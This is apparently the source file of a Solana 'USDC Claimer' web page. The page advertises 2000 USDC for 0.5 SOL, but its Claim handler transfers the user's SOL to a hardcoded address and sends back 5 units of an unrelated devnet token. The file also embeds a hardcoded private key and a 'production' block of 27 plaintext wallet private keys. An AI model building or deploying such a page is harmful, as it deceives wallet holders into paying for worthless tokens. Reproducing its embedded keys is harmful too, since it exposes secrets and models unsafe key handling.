/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "yKvfdDYskEbdKsLVLdA1v9e6CAD8dvfroFfDM65tqZcttapGhzuosuMncvXNnfxn7MHtKabEE5ct9LqfeLXGVky"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "SamB768dihyxLhz2JLYoA59CAe5aSXmpjoNGo5ohCPgc2oZRc3JTzqaXqZVHJbpAMhHdU5JHHZrok46e3zhyvEd",
  "key1": "4SBtRJ6StV5tifS3cxD1niDoPXQ3a4KGDwbT95QEHbNMKqZ2NX9W96442Nre5A2qvfrpjA9BLLo99NYWVGKeP8zT",
  "key2": "5fFgD8W31xxujf4HYuDVPVrWkN1UCjGZQjSB4rncjpuugb2CQUNnZAGWC7CEa29wnDkK6Y2Taqpn9LNf8VRHCt5w",
  "key3": "3XFDbxBrm2QEVJo5yinGXeah7swSjk6R1HEMjdGSv5dfanSCD71Ve4EU2dwvAviJxdp5XsZ2Xa5q5SJWnfgd48AM",
  "key4": "59fkwzqm5LBLRSQPUBctAWMaACt5VBH4rncT8FTbs4BhAAXUUSAekLWpJRKe8HfBAnMYkDC29GuWjtLpDfYiXKnn",
  "key5": "4Eyu97vKumPoWqXZutQfRuitF1aTe12gjPHGkdLsLyARRByhYKHbhKrw7J94ePxPqjZCZpvqED41AeAwoDUgPfbu",
  "key6": "5kKH4RwL3eJcSKkikHMBGkN6ax4HpYgNPTA4FV4KZkkZdsSYTgfMsTjk8ZyJBR3hgykNvqg9xLtVUbJFv7CVGaPb",
  "key7": "664En3Nr6AN7ZRyV8yJBYNJmhCUwZ4W8w6cSR6P5nJEkogBCtozSRUffuq4oeXnsBRTEEAKjq45pv42oA62B8rW",
  "key8": "4Q5GW4vK6yqLDGdv9AQUGGhtUG5r6tK8X2oovjTpcTcsUp8F89tjvXkMcF8KQ8sKaA89oWBu3izshTd9SPwXJ5Ar",
  "key9": "RMQ7ZT2fE9ncofUi3zFiTZQ539jf3LbPat48uLHHhmgdzK7habf95NPjscQDsqJEvVpLEXrZ9yV6zP565qcpCjA",
  "key10": "2zByQ6tdkPvE7BPm4svyD7h3fsDUZNbjxSGHBQrzC2WaJfbUTCT8KjDpT9UA9yprRBZXmcG4hzv2au7mmcZpHqd7",
  "key11": "FLk9XCEnFif8L12rdWw1XVeqJ8jKMt62cMtWMycDcouAxPZZmKYNHb2SqH6JjVTXULnuNyWb6nGCEb2XS7mHNtj",
  "key12": "4J2GwCvAFh9mYdwBJD25LngPpLkWG2SnEimkpcYxf7X6g4YWDazDh9yTRck88apodYUj3DQusSyLcQ7kZjCjfohG",
  "key13": "5gbSBeqAVpGxfNjL3MRx3bbk9wi5xWeSSbwxhRW2nmW7kg51MRKXnVQYayJ3QW31GUR2yG9fM8qtPwMNNCbiodpL",
  "key14": "3KkSmmrXMzqGZwG4kqUwGV7yKRq898uMrczsw7a6R9oejGXEYaaZrcMRRyKAPwnGQNehPeWqWeeY4FS6aiEPUfxg",
  "key15": "37BrG4CVy8CnzH2NvU5vLb13jRS6aAuAAhDDu4ci4YCNm8aH94W9TwaRJM5ACMMzTM8ToWoimuMJx4PwSMbJGWMz",
  "key16": "JkpmctW9jyar6zAVvVFo5BXvEx6dRqNbEcAkCcSnkE2PgPeCLTKdZcAw6mGnSwx9vWE9TfyogrzT8RGjWRCHjSh",
  "key17": "3pX5oMoVg2JsNqFLfWyZxrcUiXPX4kCw6Z7dEeLckBgGM3TKZuhZgYKaAFvSBQxKZ7f9Dr3NxmqcyvjPVZiQFXA",
  "key18": "5FL1eEMad2Efndv2wH9RnD2k92fpK3wHBBBEXGJX92WnFSMri1V8yUPFZdbJ2uMAiPBAkWRuc7B6yTJujfqdUUud",
  "key19": "5b6cTAWNjsixoP4eE6ZPSJXoE6Qa6Nz5FBkKcQfiCrAkR4xoduxXwAHX9HhGeHDTYmdD7HcZeitbJNUBjtsimUpS",
  "key20": "2QcgHtMqJjkYGWqvME5duzxmd9C6NK4qnNXzQ8yDP3xPbMA3pu3EouCr8jhrFb6mapoRaW1tzqmjBg2EyqSnFuhX",
  "key21": "5X86X6YApGsFs1rmzvycuUydEATRpRUgdW9yGTBpaM3XWQBKyjQNT3aX8NmtuTmNh7kpAJagkHN4ELJfNWv7vRko",
  "key22": "2X8rY2t8NokEXUZkTFppWCozrsieyFEUejJFMh8K662hR2vXH7hH84r1e3UeTiUn9iSWi5KafZeVtPx4SzkvXE7q",
  "key23": "4HcWVQt98zbUuh8DdzvFjF1sjaswAoKYNrdvEYJSy8ucqp5GdJYr22pznSFj8qTquDam3EmvECFUQKwAJAWasHFu",
  "key24": "5SWcMdgK6G5B7NLPrMaHB7oqqe8U5gRkQA66LutGKsBaMfU8BbUThQWaqqZ4Dj55XiHXPoTSdv9Pew9fyLvugLpa",
  "key25": "2WDG6jNTJFDJN9UkiYPB3mwvsVWwHky9igbUbt51xUjwvWLJeetYFvqEXCpVU8wXfLzwNB1tPuTx4yfVcaAb1Y7p",
  "key26": "6KcNX6LoXdfQXFbF4S15hQxTQCkpapgpDfk8V6f9CYPje15jAAkDtYBwRPrcf6qsHGdFVczCcn9ZHf8c4Z5DmSD"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
